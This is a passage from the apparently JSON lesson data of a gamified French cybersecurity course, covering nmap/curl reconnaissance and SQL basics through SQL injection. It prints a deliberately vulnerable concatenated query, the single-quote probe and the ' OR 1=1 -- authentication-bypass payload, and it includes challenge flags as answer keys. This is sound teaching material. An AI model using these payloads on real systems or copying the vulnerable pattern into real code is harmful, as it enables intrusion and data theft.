            "debrief": "Exact ! C'est le fondement de la phase d'énumération."
          },
          {
            "text": "Remplacer le système d'exploitation par une distribution Linux.",
            "isCorrect": false,
            "debrief": "Faux. nmap n'installe aucun système d'exploitation."
          },
          {
            "text": "Augmenter la vitesse du débit de la fibre optique.",
            "isCorrect": false,
            "debrief": "Faux. Aucun logiciel ne peut dépasser les limites physiques de la ligne."
          },
          {
            "text": "Formater les disques durs des serveurs distants sans mot de passe.",
            "isCorrect": false,
            "debrief": "Faux. nmap est un outil d'exploration, pas un destructeur."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, tape 'nmap -sV localhost'. Soumets l'intitulé exact du port et du protocole ouvert découverts (ex: 3333/tcp) !",
      "flag": "3333/tcp"
    }
  },
  {
    "id": "m2-l12",
    "unitId": "m2",
    "title": "12. ★ BOSS FIGHT RÉSEAU : RECONNAISSANCE ★",
    "icon": "👑",
    "xp": 100,
    "isBoss": true,
    "lessonSlides": [
      {
        "title": "La Chaîne Complète de Reconnaissance Réseau",
        "bullets": [
          "Tu as appris ce qu'est une IP, un port, les sockets en écoute (`ss`), la poignée de main TCP, le protocole DNS, les en-têtes HTTP, l'outil `curl` et le scanner `nmap`.",
          "Pour valider la Piste 2, tu dois combiner ces compétences comme un véritable analyste :",
          "1. Vérifier les ports ouverts avec `nmap`.",
          "2. Interroger la cible avec `curl` sur le chemin d'indexation secret `/robots.txt`.",
          "3. Capturer le drapeau d'homologation réseau !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"20\" width=\"360\" height=\"80\" rx=\"10\" fill=\"#030712\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#fbbf24\" font-size=\"14\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">★ ÉPREUVE D'HOMOLOGATION RÉSEAU ★</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">Scan Nmap ➔ Découverte de Port ➔ Extraction curl</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "bash",
        "lines": [
          {
            "num": 1,
            "text": "# Démarche d'audit : extrait le fichier d'indexation web avec curl :"
          },
          {
            "num": 2,
            "text": "operator@cyberlab:~$ curl -s http://localhost:3333/robots.txt",
            "isCritical": true,
            "note": "curl télécharge directement la ressource sensible"
          },
          {
            "num": 3,
            "text": "FLAG=CYBER{HTTP_GET_ROBOTS_TXT_FOUND}"
          }
        ],
        "prompt": "Clique sur la commande qui interroge et extrait le fichier robots.txt :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la commande finale pour extraire robots.txt :",
        "tokens": [
          "curl",
          "http://localhost:3333/robots.txt",
          "nmap",
          "ping"
        ],
        "correctOrder": [
          "curl",
          "http://localhost:3333/robots.txt"
        ]
      },
      "quickQuiz": {
        "prompt": "Dans une attaque ou un test d'intrusion réel, quel est l'enchaînement logique recommandé ?",
        "options": [
          {
            "text": "Lancer des attaques au hasard sans scanner la cible.",
            "isCorrect": false,
            "debrief": "Faux. Tirer au hasard est inefficace et bruyant."
          },
          {
            "text": "Supprimer immédiatement son propre système d'exploitation.",
            "isCorrect": false,
            "debrief": "Faux. Cela détruit votre propre machine."
          },
          {
            "text": "Scan de ports (nmap) pour découvrir les services ➔ Inspection des endpoints (curl) ➔ Exploitation ciblée.",
            "isCorrect": true,
            "debrief": "Exactement ! C'est la méthodologie standard en cybersécurité."
          },
          {
            "text": "Éteindre l'ordinateur et attendre 24 heures.",
            "isCorrect": false,
            "debrief": "Faux. Cela n'accomplit aucune mission."
          }
        ]
      }
    },
    "challenge": {
      "type": "terminal",
      "instructions": "Dans le terminal, utilise 'curl http://localhost:3333/robots.txt' pour récupérer le drapeau de la mission et soumets sa valeur complète CYBER{...} !",
      "flag": "CYBER{HTTP_GET_ROBOTS_TXT_FOUND}"
    }
  },
  {
    "id": "m3-l1",
    "unitId": "m3",
    "title": "1. Qu'est-ce qu'une Base de Données ?",
    "icon": "🗄️",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Le Cœur de Tout Système Informatique",
        "bullets": [
          "Quand tu crées un compte sur un site, quand tu achètes un billet ou quand un hôpital stocke un dossier médical, où vont les données ?",
          "Elles sont stockées dans une **Base de Données Relationnelle** (comme SQLite, MySQL ou PostgreSQL).",
          "Une base de données organise les informations sous forme de **Tables**, comparables à des feuilles de calcul Excel géantes."
        ]
      },
      {
        "title": "Tables, Colonnes et Lignes",
        "bullets": [
          "Chaque table possède un nom (ex: `crm_customers` pour les clients, `crm_accounts` pour les utilisateurs).",
          "Chaque colonne définit un champ précis : `id`, `company`, `contact_name`, `contract_value`.",
          "Chaque ligne (ou enregistrement) représente une entité unique (ex: un client avec son nom et son contrat)."
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"20\" width=\"340\" height=\"80\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"45\" y=\"45\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" font-weight=\"bold\">TABLE : crm_customers</text>\n          <line x1=\"30\" y1=\"55\" x2=\"370\" y2=\"55\" stroke=\"#1e293b\" stroke-width=\"2\"/>\n          <text x=\"45\" y=\"75\" fill=\"#94a3b8\" font-size=\"10\" font-family=\"monospace\">id | company              | contact_name</text>\n          <text x=\"45\" y=\"90\" fill=\"#34d399\" font-size=\"10\" font-family=\"monospace\">1  | CyberDefense Systems | Col. Marc Renoir</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Définition d'une table relationnelle dans SQLite :"
          },
          {
            "num": 2,
            "text": "CREATE TABLE crm_customers (",
            "isCritical": true,
            "note": "CREATE TABLE déclare la structure de la table"
          },
          {
            "num": 3,
            "text": "  id INTEGER PRIMARY KEY,"
          },
          {
            "num": 4,
            "text": "  company TEXT,"
          },
          {
            "num": 5,
            "text": "  contact_name TEXT"
          },
          {
            "num": 6,
            "text": ");"
          }
        ],
        "prompt": "Clique sur la ligne SQL qui déclare la création de la table :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble l'instruction pour déclarer la création d'une table SQL :",
        "tokens": [
          "CREATE TABLE",
          "crm_customers",
          "SELECT",
          "DROP"
        ],
        "correctOrder": [
          "CREATE TABLE",
          "crm_customers"
        ]
      },
      "quickQuiz": {
        "prompt": "Dans une base de données relationnelle, que représente une 'ligne' (row) dans une table ?",
        "options": [
          {
            "text": "La vitesse de rotation du disque dur.",
            "isCorrect": false,
            "debrief": "Faux. Cela n'a aucun rapport avec le modèle relationnel."
          },
          {
            "text": "Le mot de passe de l'administrateur système.",
            "isCorrect": false,
            "debrief": "Faux. Un mot de passe est juste une valeur dans une colonne."
          },
          {
            "text": "Le câble réseau reliant le serveur au routeur.",
            "isCorrect": false,
            "debrief": "Faux. C'est un concept logiciel et non matériel."
          },
          {
            "text": "Un enregistrement unique contenant toutes les données d'une entité précise (un client, un utilisateur).",
            "isCorrect": true,
            "debrief": "Exact ! Les colonnes définissent les attributs, et chaque ligne est une instance complète."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans l'interface CRM Aegis ci-dessous, recherche le nom de contact 'Renoir' dans la barre de recherche. Soumets la raison sociale de l'entreprise cliente affichée !",
      "flag": "CyberDefense Systems"
    }
  },
  {
    "id": "m3-l2",
    "unitId": "m3",
    "title": "2. Le Langage SQL : Lire avec SELECT",
    "icon": "🔎",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Parler à la Base : Le Langage SQL",
        "bullets": [
          "Pour poser des questions à une base de données, les développeurs utilisent un langage standardisé créé dans les années 1970 : le **SQL** (Structured Query Language).",
          "C'est un langage déclaratif très proche de l'anglais naturel : tu dis *ce que tu veux*, et le moteur de base de données se charge de le trouver."
        ]
      },
      {
        "title": "L'Ordre Fondamental : SELECT ... FROM ...",
        "bullets": [
          "`SELECT` indique quelles colonnes tu veux afficher.",
          "L'étoile `*` est un joker signifiant **TOUTES les colonnes** sans exception.",
          "`FROM` indique dans quelle table chercher.",
          "Exemple : `SELECT * FROM crm_customers;` ordonne à la base d'afficher l'intégralité de la table des clients !"
        ],
        "syntaxBox": {
          "command": "SELECT company, contract_value FROM crm_customers;",
          "description": "Extrait uniquement le nom de l'entreprise et la valeur du contrat pour tous les clients.",
          "example": "CyberDefense Systems | 4500000.00"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"30\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"95\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">SELECT *</text>\n          <text x=\"95\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Prendre toutes colonnes</text>\n          <path d=\"M 170 60 L 220 60\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <rect x=\"230\" y=\"30\" width=\"140\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"300\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">FROM clients</text>\n          <text x=\"300\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Depuis la table clients</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Interroge la table pour lire toutes les colonnes :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM crm_customers;",
            "isCritical": true,
            "note": "SELECT * extrait toutes les colonnes de la table crm_customers"
          },
          {
            "num": 3,
            "text": "-- Renvoie toutes les lignes de la table"
          }
        ],
        "prompt": "Clique sur la requête SQL qui extrait toutes les colonnes :"
      },
      "tokenPuzzle": {
        "instruction": "Construis la requête SQL universelle pour lire la table crm_customers :",
        "tokens": [
          "SELECT *",
          "FROM crm_customers;",
          "WHERE",
          "DROP"
        ],
        "correctOrder": [
          "SELECT *",
          "FROM crm_customers;"
        ]
      },
      "quickQuiz": {
        "prompt": "Que signifie le symbole astérisque '*' placé immédiatement après le mot-clé SQL 'SELECT' ?",
        "options": [
          {
            "text": "Supprimer les lignes contenant des erreurs.",
            "isCorrect": false,
            "debrief": "Faux. SELECT ne supprime jamais rien, il lit seulement."
          },
          {
            "text": "Chiffrer le résultat avec un mot de passe.",
            "isCorrect": false,
            "debrief": "Faux. SQL ne chiffre pas les données via SELECT *."
          },
          {
            "text": "Multiplier les valeurs numériques par deux.",
            "isCorrect": false,
            "debrief": "Faux. Dans SELECT *, il n'y a aucune opération de multiplication arithmétique."
          },
          {
            "text": "Sélectionner l'intégralité de toutes les colonnes disponibles dans la table ciblée.",
            "isCorrect": true,
            "debrief": "Exact ! L'astérisque est un métacaractère qui évite d'avoir à lister toutes les colonnes une par une."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, tape 'Defense' dans la barre de recherche pour retrouver le contrat de la société cliente. Soumets le nom complet de l'entreprise !",
      "flag": "CyberDefense Systems"
    }
  },
  {
    "id": "m3-l3",
    "unitId": "m3",
    "title": "3. Filtrer Précisément avec WHERE",
    "icon": "🎯",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "La Clause WHERE : Trouver l'Aiguille",
        "bullets": [
          "Si une base contient 10 millions d'utilisateurs, exécuter `SELECT * FROM users;` ferait planter le serveur !",
          "On utilise la clause de filtrage **WHERE** (où) pour n'extraire que les lignes satisfaisant une condition précise.",
          "Exemple : `SELECT * FROM users WHERE username = 'admin';`."
        ]
      },
      {
        "title": "Les Opérateurs de Comparaison SQL",
        "bullets": [
          "• `=` : égalité stricte (`role = 'admin'`).",
          "• `!=` ou `<>` : différent de (`status != 'banned'`).",
          "• `>`, `<` : comparaisons numériques (`contract_value > 1000000`).",
          "• `LIKE '%terme%'` : recherche partielle (contient le terme n'importe où).",
          "• `AND` / `OR` : combine plusieurs conditions logiques !"
        ],
        "syntaxBox": {
          "command": "SELECT * FROM crm_customers WHERE company LIKE '%Global%';",
          "description": "Ne sélectionne que les clients dont le nom d'entreprise contient le mot 'Global'.",
          "example": "2 | Global Satellite Link | Sarah Jenkins"
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"20\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"70\" y=\"65\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">SELECT *</text>\n          <rect x=\"135\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#3b82f6\" stroke-width=\"2\"/>\n          <text x=\"185\" y=\"65\" fill=\"#60a5fa\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\">FROM clients</text>\n          <rect x=\"250\" y=\"30\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n          <text x=\"315\" y=\"55\" fill=\"#fbbf24\" font-size=\"10\" font-family=\"monospace\" text-anchor=\"middle\">WHERE</text>\n          <text x=\"315\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">id = 2</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Filtre pour extraire uniquement la société satellite :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM crm_customers WHERE company LIKE '%Global%';",
            "isCritical": true,
            "note": "WHERE applique la condition de filtrage spécifique"
          },
          {
            "num": 3,
            "text": "2 | Global Satellite Link | Sarah Jenkins"
          }
        ],
        "prompt": "Clique sur la requête SQL contenant la clause de filtrage WHERE :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble la requête SQL pour filtrer les comptes dont le rôle est 'Administrator' :",
        "tokens": [
          "SELECT * FROM crm_accounts",
          "WHERE role = 'Administrator';",
          "ORDER BY",
          "DROP"
        ],
        "correctOrder": [
          "SELECT * FROM crm_accounts",
          "WHERE role = 'Administrator';"
        ]
      },
      "quickQuiz": {
        "prompt": "Quel mot-clé SQL permet de poser une condition stricte pour ne retourner que les lignes correspondantes ?",
        "options": [
          {
            "text": "GROUP BY (regroupe les résultats).",
            "isCorrect": false,
            "debrief": "Faux. GROUP BY sert aux fonctions d'agrégation (SUM, COUNT)."
          },
          {
            "text": "WHERE (permet de définir les critères booléens de filtrage).",
            "isCorrect": true,
            "debrief": "Exact ! WHERE teste chaque ligne et ne garde que celles dont la condition est vraie (TRUE)."
          },
          {
            "text": "HAVING (filtre sur les agrégats).",
            "isCorrect": false,
            "debrief": "Faux. HAVING filtre après regroupement, WHERE filtre les lignes individuelles."
          },
          {
            "text": "ORDER BY (trie les résultats).",
            "isCorrect": false,
            "debrief": "Faux. ORDER BY sert à trier par ordre croissant ou décroissant."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, recherche 'Global' pour identifier le contrat de communication satellite. Soumets le nom exact de la société trouvée !",
      "flag": "Global Satellite Link"
    }
  },
  {
    "id": "m3-l4",
    "unitId": "m3",
    "title": "4. Modifier les Données : INSERT & UPDATE",
    "icon": "📝",
    "xp": 35,
    "lessonSlides": [
      {
        "title": "Au-delà de la Lecture : Modifier la Base",
        "bullets": [
          "`SELECT` ne fait que lire sans jamais rien altérer.",
          "Pour créer de nouvelles données, les développeurs utilisent `INSERT INTO`.",
          "Pour modifier un enregistrement existant, on utilise `UPDATE` combiné à `WHERE`.",
          "Pour supprimer une ligne, on utilise `DELETE FROM table WHERE ...`."
        ]
      },
      {
        "title": "Le Danger Absolu du UPDATE sans WHERE",
        "bullets": [
          "Si un développeur écrit par inadvertance `UPDATE users SET role = 'admin';` sans mettre de clause `WHERE`, **TOUS** les utilisateurs de la base deviennent administrateurs en un instant !",
          "C'est pourquoi comprendre la syntaxe SQL exacte est capital pour tout expert en sécurité."
        ],
        "syntaxBox": {
          "command": "UPDATE users SET role = 'admin' WHERE id = 42;",
          "description": "Modifie le rôle uniquement pour l'utilisateur dont l'identifiant est 42.",
          "example": "1 ligne mise à jour."
        }
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#06b6d4\" stroke-width=\"2\"/>\n          <text x=\"75\" y=\"55\" fill=\"#38bdf8\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">INSERT</text>\n          <text x=\"75\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Créer ligne</text>\n          <rect x=\"150\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"200\" y=\"55\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">UPDATE</text>\n          <text x=\"200\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Modifier ligne</text>\n          <rect x=\"275\" y=\"30\" width=\"100\" height=\"60\" rx=\"8\" fill=\"#0f172a\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"325\" y=\"55\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" text-anchor=\"middle\" font-weight=\"bold\">DELETE</text>\n          <text x=\"325\" y=\"75\" fill=\"#94a3b8\" font-size=\"9\" font-family=\"monospace\" text-anchor=\"middle\">Supprimer ligne</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- Met à jour le rôle de l'utilisateur 42 :"
          },
          {
            "num": 2,
            "text": "UPDATE crm_accounts SET role = 'Administrator' WHERE id = 42;",
            "isCritical": true,
            "note": "UPDATE modifie les valeurs de colonnes pour les lignes sélectionnées"
          },
          {
            "num": 3,
            "text": "-- 1 row updated"
          }
        ],
        "prompt": "Clique sur la requête SQL qui modifie une valeur en base :"
      },
      "tokenPuzzle": {
        "instruction": "Construis l'instruction SQL pour mettre à jour le rôle :",
        "tokens": [
          "UPDATE crm_accounts",
          "SET role = 'Administrator'",
          "WHERE id = 42;",
          "DROP"
        ],
        "correctOrder": [
          "UPDATE crm_accounts",
          "SET role = 'Administrator'",
          "WHERE id = 42;"
        ]
      },
      "quickQuiz": {
        "prompt": "Que se passe-t-il si un administrateur exécute 'UPDATE users SET role = 'admin';' sans clause WHERE ?",
        "options": [
          {
            "text": "La table est automatiquement supprimée.",
            "isCorrect": false,
            "debrief": "Faux. Pour supprimer une table, on utilise DROP TABLE."
          },
          {
            "text": "Seul le premier utilisateur créé est modifié.",
            "isCorrect": false,
            "debrief": "Faux. C'est toute la table qui est affectée."
          },
          {
            "text": "La base de données refuse l'ordre et affiche une erreur de syntaxe.",
            "isCorrect": false,
            "debrief": "Faux. En SQL standard, un UPDATE sans WHERE est parfaitement valide et dévastateur."
          },
          {
            "text": "Toutes les lignes de la table sans exception voient leur rôle modifié en 'admin'.",
            "isCorrect": true,
            "debrief": "Exactement ! Sans clause WHERE, UPDATE s'applique aveuglément à toute la table."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, recherche 'Quantum' pour trouver le projet classifié de nanotechnologie. Soumets la raison sociale de l'entreprise !",
      "flag": "Quantum Nanotech Corp"
    }
  },
  {
    "id": "m3-l5",
    "unitId": "m3",
    "title": "5. Comment Naît la Faille : Concaténation",
    "icon": "⚡",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Faute Originelle : Coller du Texte",
        "bullets": [
          "Une injection SQL ne vient **JAMAIS** d'un bug de la base de données. Elle vient TOUJOURS d'une erreur d'écriture dans le code serveur (Node.js, PHP, Python, Java).",
          "Quand un utilisateur tape son pseudo dans un formulaire, comment le serveur fabrique-t-il la requête SQL ?",
          "Si le développeur assemble la chaîne par une bête concaténation de texte : `query = \"SELECT * FROM users WHERE user = '\" + userInput + \"';\"`, la porte de l'enfer est ouverte !"
        ]
      },
      {
        "title": "La Confusion Code vs Données",
        "bullets": [
          "Dans un système sain, les données de l'utilisateur doivent rester de **simples données passives**.",
          "Mais avec la concaténation, si l'attaquant tape des caractères réservés du langage SQL (comme le guillemet `'`), le moteur de base de données les interprète comme de **nouvelles instructions de code exécutable** !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"350\" height=\"80\" rx=\"8\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"35\" y=\"45\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\">CODE VULNÉRABLE (Concaténation) :</text>\n          <text x=\"35\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">\"SELECT * FROM users WHERE name = '\" + <tspan fill=\"#f59e0b\" font-weight=\"bold\">userInput</tspan> + \"'\"</text>\n          <text x=\"35\" y=\"88\" fill=\"#38bdf8\" font-size=\"9\" font-family=\"monospace\">Si userInput contient ' ➔ la chaîne SQL est brisée !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "javascript",
        "lines": [
          {
            "num": 1,
            "text": "// ❌ CODE BACKEND FAUTIF (Concaténation de chaîne non assainie) :"
          },
          {
            "num": 2,
            "text": "const sql = `SELECT * FROM crm_customers WHERE company LIKE '%${req.query.search}%'`;",
            "isCritical": true,
            "note": "La concaténation directe de req.query.search permet à l'attaquant d'injecter du SQL"
          },
          {
            "num": 3,
            "text": "const results = db.prepare(sql).all();"
          }
        ],
        "prompt": "Clique sur la ligne de code backend contenant la vulnérabilité de concaténation :"
      },
      "tokenPuzzle": {
        "instruction": "Assemble le fragment vulnérable montrant la concaténation de paramètres :",
        "tokens": [
          "WHERE company LIKE '%",
          "${req.query.search}",
          "%'",
          "db.prepare(?)"
        ],
        "correctOrder": [
          "WHERE company LIKE '%",
          "${req.query.search}",
          "%'"
        ]
      },
      "quickQuiz": {
        "prompt": "Quelle est la cause fondamentale de l'apparition d'une faille par injection SQL dans une application web ?",
        "options": [
          {
            "text": "L'assemblage direct d'entrées utilisateur brutes dans la syntaxe de la requête SQL sans requêtes préparées.",
            "isCorrect": true,
            "debrief": "Exact ! Le moteur SQL confond alors les données utilisateur avec des commandes du langage."
          },
          {
            "text": "L'utilisation d'un mot de passe trop court pour la base de données.",
            "isCorrect": false,
            "debrief": "Faux. Même avec un mot de passe de 100 caractères, la faille reste exploitable."
          },
          {
            "text": "Le fait que le disque dur soit formaté en NTFS.",
            "isCorrect": false,
            "debrief": "Faux. Le système de fichiers n'a aucun lien avec la logique applicative SQL."
          },
          {
            "text": "L'absence de connexion Internet sur le serveur.",
            "isCorrect": false,
            "debrief": "Faux. La faille existe localement dès que le serveur traite une entrée."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, tape un simple guillemet simple ' dans la barre de recherche. Observe la boîte d'alerte rouge et soumets le message d'erreur SQL affiché (Database Query Error) !",
      "flag": "Database Query Error"
    }
  },
  {
    "id": "m3-l6",
    "unitId": "m3",
    "title": "6. L'Erreur du Guillemet Simple (')",
    "icon": "⚡",
    "xp": 40,
    "lessonSlides": [
      {
        "title": "La Sonde Numéro 1 du Pentesteur : Le Guillemet",
        "bullets": [
          "Quand un hacker éthique teste un champ de saisie (barre de recherche, formulaire de login, paramètre d'URL `?id=1`), quel est son tout premier réflexe ?",
          "Taper un simple **guillemet droit** : `'`.",
          "Pourquoi ? Parce qu'en SQL, les chaînes de texte sont délimitées par des paires de guillemets : `'mon_texte'`."
        ]
      },
      {
        "title": "Provoquer une Erreur de Syntaxe",
        "bullets": [
          "Si le développeur a écrit : `SELECT * FROM clients WHERE nom = 'ENTREE_UTILISATEUR';`",
          "Et que tu injectes `'`, la requête devient : `SELECT * FROM clients WHERE nom = ''';`.",
          "Il y a maintenant **3 guillemets** ! Le moteur SQL ne sait plus où s'arrête la chaîne et génère un crash : **Syntax Error / Unclosed quotation mark**.",
          "Si cette erreur apparaît à l'écran, félicitations : tu viens de prouver que l'application est vulnérable à l'injection SQL !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"25\" width=\"350\" height=\"70\" rx=\"8\" fill=\"#030712\" stroke=\"#f43f5e\" stroke-width=\"2\"/>\n          <text x=\"40\" y=\"50\" fill=\"#f87171\" font-size=\"11\" font-family=\"monospace\" font-weight=\"bold\">ANALYSE DU CRASH SYNTAXIQUE :</text>\n          <text x=\"40\" y=\"70\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">WHERE company LIKE '%<tspan fill=\"#f59e0b\" font-weight=\"bold\">'</tspan>%' ➔ 3 guillemets impairs !</text>\n          <text x=\"40\" y=\"85\" fill=\"#f43f5e\" font-size=\"9\" font-family=\"monospace\">Moteur SQLite : \"unrecognized token\" (Erreur 500)</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
            "text": "-- La requête brisée par l'injection d'un simple guillemet :"
          },
          {
            "num": 2,
            "text": "SELECT * FROM crm_customers WHERE company LIKE '%'%';",
            "isCritical": true,
            "note": "Le 3ème guillemet casse la clôture de chaîne et déclenche une erreur de syntaxe"
          },
          {
            "num": 3,
            "text": "-- Résultat : SQLite error: unrecognized token"
          }
        ],
        "prompt": "Clique sur la requête SQL dont la syntaxe est rompue par le guillemet :"
      },
      "tokenPuzzle": {
        "instruction": "Tape la sonde minimale universelle pour tester la présence d'une injection SQL :",
        "tokens": [
          "'",
          "\"",
          "--",
          "SELECT"
        ],
        "correctOrder": [
          "'"
        ]
      },
      "quickQuiz": {
        "prompt": "Pourquoi l'injection d'un guillemet simple (') déclenche-t-elle souvent une erreur 500 dans une application vulnérable ?",
        "options": [
          {
            "text": "Parce qu'il crée un nombre impair de guillemets, brisant la clôture de la chaîne textuelle attendue par l'analyseur SQL.",
            "isCorrect": true,
            "debrief": "Exact ! L'analyseur lexical (parser) rencontre une chaîne non fermée et lève une exception non gérée."
          },
          {
            "text": "Parce qu'il surcharge la mémoire vive de l'ordinateur de l'utilisateur.",
            "isCorrect": false,
            "debrief": "Faux. Un guillemet pèse 1 seul octet."
          },
          {
            "text": "Parce que le guillemet est un caractère interdit par le protocole TCP.",
            "isCorrect": false,
            "debrief": "Faux. TCP transporte tous les octets ASCII sans distinction."
          },
          {
            "text": "Parce qu'il envoie un signal d'extinction au serveur web.",
            "isCorrect": false,
            "debrief": "Faux. C'est une erreur de parsing syntaxique SQL."
          }
        ]
      }
    },
    "challenge": {
      "type": "crm_target",
      "instructions": "Dans le CRM Aegis, teste la sonde ' dans la recherche pour forcer le crash du moteur SQLite. Soumets le texte d'erreur affiché (Database Query Error) !",
      "flag": "Database Query Error"
    }
  },
  {
    "id": "m3-l7",
    "unitId": "m3",
    "title": "7. Le Bypass d'Auth : ' OR 1=1 --",
    "icon": "🔓",
    "xp": 45,
    "lessonSlides": [
      {
        "title": "La Charge Utile la Plus Célèbre du Monde",
        "bullets": [
          "Après avoir prouvé qu'un guillemet brise la requête, l'attaquant veut en reprendre le contrôle.",
          "Pour cela, il injecte le payload légendaire : `' OR 1=1 --`.",
          "Décortiquons chirurgicalement chacun de ces 4 fragments :"
        ]
      },
      {
        "title": "Anatomie du ' OR 1=1 --",
        "bullets": [
          "1. `'` : ferme proprement la chaîne textuelle ouverte par le développeur.",
          "2. `OR` : opérateur logique (la condition globale sera vraie si au moins UNE des conditions est vraie).",
          "3. `1=1` : une vérité mathématique absolue qui est **TOUJOURS VRAIE** (TRUE).",
          "4. `-- ` : le symbole de commentaire SQL qui ordonne au moteur d'**ignorer et jeter à la poubelle** tout le reste de la requête d'origine (comme la vérification du mot de passe) !"
        ]
      }
    ],
    "microCard": {
      "svgVisual": "\n        <svg viewBox=\"0 0 400 120\" class=\"w-full h-full\">\n          <rect x=\"25\" y=\"20\" width=\"350\" height=\"80\" rx=\"8\" fill=\"#030712\" stroke=\"#10b981\" stroke-width=\"2\"/>\n          <text x=\"35\" y=\"45\" fill=\"#34d399\" font-size=\"11\" font-family=\"monospace\">REQUÊTE DÉTOURNÉE PAR L'ATTAQUANT :</text>\n          <text x=\"35\" y=\"65\" fill=\"#94a3b8\" font-size=\"11\" font-family=\"monospace\">WHERE user = '<tspan fill=\"#38bdf8\">'</tspan> <tspan fill=\"#fbbf24\">OR 1=1</tspan> <tspan fill=\"#f43f5e\">-- ' AND pass = '...'</tspan></text>\n          <text x=\"35\" y=\"85\" fill=\"#10b981\" font-size=\"10\" font-family=\"monospace\">1=1 est toujours VRAI ➔ Authentification contournée !</text>\n        </svg>\n      ",
      "codeSnippet": {
        "language": "sql",
        "lines": [
          {
            "num": 1,
